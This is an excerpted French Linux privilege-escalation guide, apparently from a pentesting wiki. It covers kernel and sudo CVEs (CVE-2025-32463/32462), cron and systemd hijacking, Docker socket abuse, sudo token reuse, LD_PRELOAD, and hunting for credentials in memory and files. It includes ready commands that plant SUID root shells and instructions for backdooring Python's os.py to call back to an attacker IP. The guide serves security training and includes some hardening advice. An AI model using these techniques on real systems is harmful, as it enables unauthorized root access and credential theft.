...
Si vous avez des **permissions d’écriture sur un dossier quelconque dans la variable `PATH`**, vous pouvez être en mesure de détourner certaines bibliothèques ou certains binaires :
```bash
echo $PATH
```
...
```
Vous pouvez trouver une bonne liste de kernels vulnérables et quelques **exploits déjà compilés** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ainsi que des [sploits exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
...
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, vérifie uniquement les exploits pour le kernel 2.x)

Recherchez toujours **la version du kernel sur Google**, car il est possible que votre version du kernel soit mentionnée dans un kernel exploit ; vous serez alors certain que cet exploit est valide.
...
Escalade de privilèges Linux - Kernel Linux <= 3.19.0-73.8
```bash
...
Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent aux utilisateurs locaux non privilégiés d'élever leurs privilèges jusqu'à root via l'option `--chroot` de sudo lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.<sup>[[28]](#references)[[29]](#references)</sup>

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) permettant d'exploiter cette [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'[advisory originale concernant la vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)<sup>[[28]](#references)</sup>

### Contournement des règles Sudo basées sur l'hôte (CVE-2025-32462)

Sudo antérieur à 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l'hôte en utilisant le **hostname fourni par l'utilisateur** via `sudo -h <host>` au lieu du **hostname réel**. Si sudoers accorde des privilèges plus larges sur un autre hôte, vous pouvez **spoof** cet hôte localement.<sup>[[29]](#references)</sup>

Exigences :
- Version vulnérable de sudo
- Règles sudoers spécifiques à l'hôte (l'hôte n'est ni le hostname actuel ni `ALL`)

Exemple de pattern sudoers :
```
...
sudo -h devbox -i
```
Si la résolution du nom usurpé est bloquée, ajoutez-le à `/etc/hosts` ou utilisez un nom d’hôte qui apparaît déjà dans les logs/configurations afin d’éviter les recherches DNS.
...
Si vous êtes à l’intérieur d’un container, commencez par la section suivante sur la container-security, puis pivotez vers les pages d’abus spécifiques au runtime :
...
```
Vérifiez également si **un compilateur quelconque est installé**. Cela peut être utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il est possible qu’une ancienne version de Nagios, par exemple, puisse être exploitée pour élever les privilèges…\
...
> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront pour la plupart inutiles. Il est donc recommandé d'utiliser certaines applications comme OpenVAS ou similaires, qui vérifieront si une version d'un logiciel installé est vulnérable à des exploits connus._

## Processus

Examinez **quels processus** sont exécutés et vérifiez si l'un d'eux dispose de **privilèges supérieurs à ceux qu'il devrait avoir** (par exemple, un tomcat exécuté par root ?).
```bash
ps aux
ps -ef
top -n 1
...
Vérifiez également **vos privilèges sur les binaires des processus**, vous pourrez peut-être en écraser un.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant exécuté sous un **utilisateur différent** de son parent n’est pas automatiquement malveillant, mais constitue un **signal de triage** utile. Certaines transitions sont attendues (`root` lançant un utilisateur de service, les gestionnaires de connexion créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des assistants de débogage, de la persistence ou des limites de confiance d’exécution faibles.
...
pstree -alp
```
Si vous trouvez une chaîne surprenante, examinez la ligne de commande du processus parent ainsi que tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts auxiliaires, répertoire de travail, arguments modifiables en écriture). Dans plusieurs chemins réels de privesc, le processus enfant lui-même n'était pas modifiable en écriture, mais la **configuration contrôlée par le parent** ou la chaîne de scripts auxiliaires l'était.

### Exécutables supprimés et fichiers supprimés mais encore ouverts

Les artefacts d'exécution sont souvent encore accessibles **après leur suppression**. Cela peut être utile à la fois pour l'escalade de privilèges et pour récupérer des preuves à partir d'un processus qui a déjà ouvert des fichiers sensibles.
...
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire depuis la mémoire. C’est un signal fort à examiner, car :
...
Collectez globalement les fichiers supprimés et ouverts :
```bash
lsof +L1
```
...
cat /proc/<PID>/fd/<FD>
```
Ceci est particulièrement utile lorsqu'un processus conserve ouvert un secret, un script, un export de base de données ou un fichier de flags supprimé.
...
Normalement, vous aurez besoin des **privilèges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs ; cela est donc généralement plus utile lorsque vous êtes déjà root et que vous souhaitez découvrir davantage de credentials.\
...
>
> - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être débogués, tant qu'ils possèdent le même uid. C'est le fonctionnement classique de ptrace.
...
`/dev/mem` fournit un accès à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adressage virtuel du kernel est accessible via /dev/kmem.\
...
ProcDump est une réimplémentation Linux de l'outil classique ProcDump de la suite d'outils Sysinternals pour Windows. Procurez-vous-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
L’outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en texte clair depuis la mémoire** ainsi que depuis certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.
...
### Crontab UI (alseambusher) exécuté en tant que root – escalation de privilèges via un scheduler web

Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en tant que root et est uniquement lié à loopback, vous pouvez tout de même y accéder via une redirection de port SSH locale et créer une tâche privilégiée pour effectuer une escalation.<sup>[[1]](#references)[[4]](#references)</sup>

Chaîne typique
- Identifier le port accessible uniquement via loopback (p. ex. 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
...
```
- Créez une tâche avec des privilèges élevés et exécutez-la immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
...
```
Hardening
- N'exécutez pas Crontab UI en tant que root ; limitez-le à un utilisateur dédié avec des permissions minimales
- Liez-le à localhost et restreignez également l'accès via un firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d'intégrer des secrets dans les unit files ; utilisez des secret stores ou un EnvironmentFile accessible uniquement à root
- Activez l'audit/la journalisation pour les exécutions de jobs à la demande

Vérifiez si un scheduled job est vulnérable. Vous pouvez peut-être tirer parti d'un script exécuté par root (wildcard vuln ? Pouvez-vous modifier des fichiers utilisés par root ? Utiliser des symlinks ? Créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
...
```
Cela évite les faux positifs. Un répertoire périodique accessible en écriture est uniquement utile si le nom de fichier de votre `payload` respecte les règles locales de `run-parts`.
...
(_Notez que l’utilisateur « user » dispose de droits d’écriture sur /home/user_)
...
Si un script est exécuté par root et contient un « **\*** » dans une commande, vous pourriez exploiter cela pour provoquer des effets inattendus (comme une privesc). Exemple :
```bash
...
Si vous **pouvez modifier un script cron** exécuté avec les privilèges root, vous pouvez très facilement obtenir un shell :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un lien symbolique vers un autre répertoire** contenant un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l’examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers via leur chemin, vérifiez la manière dont les liens sont gérés :
...
```
Pour les defenders/developers, voici des pratiques plus sûres contre les attaques basées sur les symlinks :
...
### Binaries cron signés sur mesure avec des payloads accessibles en écriture

Les équipes Blue team « signent » parfois les binaries exécutés par cron en extrayant une section ELF personnalisée et en recherchant une chaîne du fournisseur avant de les exécuter en tant que root. Si ce binary est accessible en écriture par le groupe (par exemple, `/opt/AV/periodic-checks/monitor` appartenant à `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez falsifier la section et détourner la tâche cron :<sup>[[2]](#references)</sup>

1. Utilisez `pspy` pour capturer le processus de vérification. Dans Era, root exécutait `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, puis `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, avant d’exécuter le fichier.
...
```
5. Attendez la prochaine exécution de cron ; une fois la vérification de signature naïve réussie, votre payload s’exécutera en tant que root.
...
Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez y déposer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans la sortie de sauvegarde.<sup>[[26]](#references)</sup>

Flux de découverte typique (en tant qu’utilisateur DB à faibles privilèges) :
- Utilisez `pspy` pour repérer un cron root qui appelle quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Confirmez que le cluster source (par ex. `/var/lib/postgresql/14/main`) est accessible en écriture pour vous et que la destination (`/opt/backups/current`) devient détenue par root après l’exécution de la tâche.
...
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu'il est exécuté par root, les fichiers de destination héritent de la **propriété root + des bits SUID/SGID choisis par l'attaquant**. Toute routine de sauvegarde/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.
...
Gardez à l’esprit que si vous disposez des **permissions d’écriture sur les binaires exécutés par les services**, vous pouvez les modifier pour y ajouter des backdoors afin que celles-ci soient exécutées lorsque les services sont réexécutés.
...
```
Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être **élever vos privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services**, tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** dans le dossier du PATH de systemd dans lequel vous pouvez écrire. Lorsque le service est invité à exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers d’unités systemd dont le nom se termine par `**.timer**` et qui contrôlent les fichiers `**.service**` ou les événements. Les **Timers** peuvent être utilisés comme alternative à cron, car ils prennent en charge nativement les événements temporels du calendrier et les événements temporels monotones, et peuvent être exécutés de manière asynchrone.
...
- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous disposez de **privilèges d'écriture** concernant le **PATH de systemd** (pour usurper l'identité de cet exécutable)
...
Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur une même machine ou sur des machines différentes dans le cadre de modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.<sup>[[14]](#references)</sup>
...
- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : ces options sont différentes, mais servent globalement à **indiquer où le socket va écouter** (le chemin du fichier socket AF_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
...
### Activation de socket + chemin d'unité inscriptible (création du service manquant)
...
Notez qu'il peut y avoir des **sockets à l'écoute de requêtes HTTP** (_je ne parle pas des fichiers .socket, mais des fichiers faisant office de sockets Unix_). Vous pouvez le vérifier avec :
```bash
...
Lorsque la Docker CLI n’est pas disponible, le socket Docker peut toujours être exploité à l’aide de HTTP brut via le socket Unix. Le flux le plus fiable consiste à :

- créer un container helper de longue durée avec le répertoire root de l’hôte monté via bind mount
- le démarrer
- créer une instance `exec` à l’intérieur de ce helper
...
```
Ce pattern est généralement plus robuste que d'essayer de piloter `attach` manuellement avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances `exec` supplémentaires pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH sous `/host/root/.ssh`, ou modifier les fichiers de démarrage de l'hôte.

### Others

Notez que si vous disposez des permissions d'écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**davantage de moyens d'effectuer une privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si l'[**API Docker écoute sur un port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), vous pouvez également être en mesure de la compromettre.

Consultez **davantage de moyens de sortir des containers ou d'abuser des container runtimes pour effectuer une privilege escalation** dans :
...
Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante, car **vous pourrez peut-être l'exploiter pour effectuer une privilege escalation** :
...
Si vous découvrez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante, car **vous pourrez peut-être l'exploiter pour effectuer une privilege escalation** :
...
Le système est polyvalent et prend en charge un IPC de base qui améliore l'échange de données entre les processus, à la manière de **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal d'un daemon Bluetooth signalant un appel entrant peut inciter un lecteur de musique à couper le son, améliorant ainsi l'expérience utilisateur. De plus, D-Bus prend en charge un système d'objets distants, simplifiant les requêtes de services et les invocations de méthodes entre les applications, et rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un **modèle allow/deny**, en gérant les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l'effet cumulatif des règles de policy correspondantes. Ces policies définissent les interactions avec le bus et peuvent permettre une privilege escalation par l'exploitation de ces permissions.

Un exemple d'une telle policy dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions permettant à l'utilisateur root de posséder, d'envoyer et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les policies sans utilisateur ni groupe spécifié s'appliquent universellement, tandis que les policies du contexte "default" s'appliquent à tous les éléments qui ne sont pas couverts par d'autres policies spécifiques.
```xml
<policy user="root">
...
### Workflow de triage des services accessibles uniquement en local

Lorsque vous compromettez un host, les services bindés sur `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un workflow local rapide est le suivant :
```bash
...
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS comme network scanner (network-only mode)

En plus des vérifications locales de PE, linPEAS peut fonctionner comme un network scanner ciblé. Il utilise les binaires disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.
```bash
...
```
Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un pure network scanner (en ignorant le reste des vérifications de privilege-escalation).
...
Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents sur les systèmes, lesquels peuvent **login** et lesquels disposent de **privilèges root** :
```bash
#Info about me
...
Certaines versions de Linux étaient affectées par un bug permettant aux utilisateurs avec un **UID > INT_MAX** d'effectuer une escalation de privilèges. Plus d'informations : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
...
## Abus des chemins $PATH inscriptibles
...
```
Certaines **commandes inattendues vous permettent de lire et/ou d’écrire des fichiers, voire d’exécuter une commande.**<sup>[[8]](#references)</sup> Par exemple :
```bash
...
Si un **script Python autorisé par sudo** importe un module dont le répertoire du package contient un **`__pycache__` inscriptible**, vous pouvez potentiellement remplacer le `.pyc` mis en cache et obtenir une exécution de code avec les privilèges de l'utilisateur sur le prochain import.<sup>[[30]](#references)</sup>

- Pourquoi cela fonctionne :
- CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- L'interpréteur valide l'**en-tête** (magic + métadonnées d'horodatage/hash associées à la source), puis exécute l'objet de code marshalé stocké après cet en-tête.
...
3. Compilez un objet code contenant un payload, utilisez `marshal.dumps(...)` dessus, supprimez le fichier cache d’origine, puis recréez-le avec l’en-tête d’origine suivi de votre bytecode malveillant.
...
- Cette technique est particulièrement utile lorsque le fichier source appartient à root et n’est pas inscriptible, mais que le répertoire `__pycache__` qui le contient est inscriptible.
- L’attaque échoue si le processus privilégié utilise `PYTHONDONTWRITEBYTECODE=1`, importe depuis un emplacement doté de permissions sûres ou supprime l’accès en écriture de chaque répertoire du chemin d’importation.

Structure minimale du proof-of-concept :
```python
...
- Vérifiez qu’aucun répertoire du chemin d’import Python privilégié n’est accessible en écriture par des utilisateurs peu privilégiés, y compris `__pycache__`.
...
Si sudoers conserve `BASH_ENV` (par exemple, `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l’invocation d’une commande autorisée.<sup>[[24]](#references)</sup>

- Pourquoi cela fonctionne : Pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d’exécuter le script cible. De nombreuses règles sudo autorisent l’exécution d’un script ou d’un wrapper shell. Si `BASH_ENV` est conservé par sudo, votre fichier est sourcé avec les privilèges root.<sup>[[23]](#references)</sup>
...
```
- Hardening :
- Supprimez `BASH_ENV` (et `ENV`) de `env_keep`, et préférez `env_reset`.
- Évitez les shell wrappers pour les commandes autorisées par sudo ; utilisez des binaires minimaux.
- Envisagez la journalisation des entrées/sorties de sudo et la génération d'alertes lorsque des variables d'environnement préservées sont utilisées.
...
- Pointez le provider requis vers un répertoire accessible en écriture et déposez-y un plugin malveillant portant le nom du provider (par exemple, `terraform-provider-examples`) :
```hcl
# ~/.terraformrc
...
### Contournement de la validation des symlinks avec TF_VAR

Les variables Terraform peuvent être fournies via les variables d'environnement `TF_VAR_<name>`, qui sont conservées lorsque sudo préserve l'environnement. Les validations faibles telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :<sup>[[25]](#references)</sup>
```bash
...
```
Terraform résout le symlink et copie le véritable `/root/root.txt` vers une destination lisible par l’attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en créant au préalable des symlinks de destination (par exemple, en faisant pointer le chemin de destination du provider vers un emplacement à l’intérieur de `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui force sudo à s’exécuter uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs tels que des reverse shells, des tâches cron ou des scripts.
```bash
Defaults !requiretty
```
Ce n’est pas une vulnérabilité directe en soi, mais cela élargit les situations dans lesquelles les règles sudo peuvent être exploitées sans avoir besoin d’un PTY complet.
...
- Conditions requises : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.), ainsi qu’une entrée PATH accessible en écriture et recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
...
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d’un binaire SUID étrange)**.
...
Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, vous pouvez alors essayer d’**exporter une fonction** portant le nom de la commande appelée par le fichier suid.
...
Une mauvaise configuration courante d'une application personnalisée consiste en un wrapper binaire SUID appartenant à root qui exécute un script, tandis que le script lui-même est accessible en écriture pour les utilisateurs disposant de faibles privilèges.
...
```
Cette voie d'attaque est particulièrement courante dans les wrappers de "maintenance"/"backup" fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs shared libraries (fichiers .so) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est connu sous le nom de preloading d'une library.

Cependant, afin de préserver la sécurité du système et d'empêcher l'exploitation de cette fonctionnalité, notamment avec les exécutables **suid/sgid**, le système impose certaines conditions :
...
- Pour les exécutables avec suid/sgid, seules les libraries situées dans des chemins standard et qui sont également suid/sgid sont preloadées.
...
```
> [!CAUTION]
> Une privesc similaire peut être exploitée si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH**, car il contrôle le chemin dans lequel les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>
...
Lorsqu'on rencontre un binaire avec des permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :<sup>[[17]](#references)</sup>
```bash
...
```
Enfin, l’exécution du binaire SUID vulnérable devrait déclencher l’exploit, permettant une compromission potentielle du système.
...
```
cela signifie que la library que vous avez générée doit avoir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix pouvant être exploités par un attaquant afin de contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est similaire, mais concerne les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet recense les fonctions légitimes des binaires Unix qui peuvent être détournées pour sortir de restricted shells, élever ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter d'autres tâches de post-exploitation.
...
### Réutilisation des Sudo Tokens

Dans les cas où vous avez **un accès sudo**, mais pas le mot de passe, vous pouvez élever vos privilèges en **attendant l'exécution d'une commande sudo, puis en détournant le session token**.<sup>[[18]](#references)</sup>

Conditions requises pour élever les privilèges :

- Vous disposez déjà d'un shell en tant que "_sampleuser_"
...
(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, ou le modifier de manière permanente dans `/etc/sysctl.d/10-ptrace.conf` en définissant `kernel.yama.ptrace_scope = 0`.)

Si toutes ces conditions sont remplies, **vous pouvez élever vos privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le sudo token dans votre session** (vous n'obtiendrez pas automatiquement un shell root ; exécutez `sudo su`) :
```bash
bash exploit.sh
...
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) créera un **fichier sudoers** qui rend les **sudo tokens** éternels et autorise tous les utilisateurs à utiliser sudo
```bash
bash exploit_v3.sh
sudo su
```
...
Si vous disposez de **permissions d’écriture** dans le dossier ou sur l’un des fichiers créés à l’intérieur de celui-ci, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un token sudo pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :
```bash
...
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous pourrez **escalader vos privilèges**.
```bash
...
Consultez la page suivante pour **en apprendre davantage sur les capabilities et sur la manière de les exploiter** :
...
Dans un répertoire, le **bit « execute »** signifie que l'utilisateur concerné peut effectuer un **« cd »** vers le dossier.\
...
```
**Obtenir** les fichiers dotés d’ACL spécifiques du système :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL cachée dans les drop-ins sudoers

Une mauvaise configuration courante est un fichier appartenant à `root` dans `/etc/sudoers.d/` avec le mode `440`, qui accorde tout de même un accès en écriture à un utilisateur peu privilégié via une ACL.
```bash
ls -l /etc/sudoers.d/*
...
Dans les **versions les plus récentes**, vous pourrez **connect** aux sessions screen uniquement avec votre **propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes à l'intérieur de la session**.
...
```
![Détournement de sessions screen - Emplacements des sockets (certains systèmes en exposent un sous forme de lien symbolique vers l'autre) : ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
...
Il s'agissait d'un problème des **anciennes versions de tmux**. Je n'ai pas pu détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.
...
- **PermitEmptyPasswords**: lorsque l'authentification par mot de passe est autorisée, indique si le serveur permet la connexion à des comptes dont le mot de passe est vide. La valeur par défaut est `no`.

### Fichiers de contrôle de connexion

Ces fichiers influencent les utilisateurs pouvant se connecter et la manière dont ils peuvent le faire :

- **`/etc/nologin`**: s'il est présent, bloque les connexions des utilisateurs autres que root et affiche son message.
- **`/etc/securetty`**: restreint les endroits depuis lesquels root peut se connecter (liste des TTY autorisés).
...
- `forced-commands-only`: root peut uniquement se connecter avec une clé privée et si les options de commande sont spécifiées
- `no` : aucune connexion
...
Le forwarding de l’agent SSH vous permet d’**utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrase secrète !) sur votre serveur. Ainsi, vous pourrez **sauter** via ssh **vers un hôte**, puis depuis celui-ci **sauter vers un autre** hôte **en utilisant** la **clé** située sur votre **hôte initial**.
...
Le fichier `/etc/sshd_config` peut **autoriser ou refuser** le transfert de ssh-agent avec le mot-clé `AllowAgentForwarding` (la valeur par défaut est l'autorisation).

Si vous constatez que Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez être en mesure de l'exploiter pour escalader vos privilèges** :
...
Le fichier `/etc/profile` et les fichiers situés sous `/etc/profile.d/` sont des **scripts exécutés lorsqu'un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez escalader vos privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil inhabituel est trouvé, vous devez le vérifier pour détecter des **informations sensibles**.

### Fichiers Passwd/Shadow

Selon l’OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent utiliser un nom différent ou il peut y avoir une sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s’ils contiennent des hashes** :
```bash
...
```
Dans certains cas, vous pouvez trouver des **password hashes** dans le fichier `/etc/passwd` (ou équivalent)
```bash
...
```
### Fichiers situés dans des emplacements inhabituels/appartenant à l'utilisateur
```bash
...
De plus, certains **logs d'audit** mal configurés (avec une backdoor ?) peuvent vous permettre **d'enregistrer des mots de passe** dans les logs d'audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour pouvoir **lire les logs, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera très utile.
...
~/.zshrc #zsh shell
```
### Recherche générique de credentials/Regex

Vous devriez également rechercher les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, et rechercher les IP et les adresses e-mail dans les logs, ainsi que les regexps de hashes.\
...
### Détournement de bibliothèques Python

Si vous savez **depuis où** un script Python va être exécuté et que vous **pouvez écrire dans** ce dossier, ou que vous **pouvez modifier des bibliothèques Python**, vous pouvez modifier la bibliothèque de l'OS et y ajouter une backdoor (si vous pouvez écrire à l'endroit où le script Python va être exécuté, copiez-collez la bibliothèque os.py).

Pour **ajouter une backdoor à la bibliothèque**, ajoutez simplement la ligne suivante à la fin de la bibliothèque os.py (modifiez l'IP et le PORT) :
```python
...
Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs nginx),** donc chaque fois que vous découvrez que vous pouvez modifier des logs, vérifiez qui les gère et si vous pouvez élever vos privilèges en remplaçant les logs par des liens symboliques.
...
Si, pour quelque raison que ce soit, un utilisateur est capable d’**écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** de **modifier** un script existant, alors votre **système est pwned**.<sup>[[20]](#references)</sup>
...
Dans mon cas, l’attribut `NAME=` de ces scripts réseau n’est pas géré correctement. Si le nom contient des **espaces blancs**, le système tente d’**exécuter la partie située après l’espace blanc**. Cela signifie que **tout ce qui suit le premier espace blanc est exécuté en tant que root**.
...
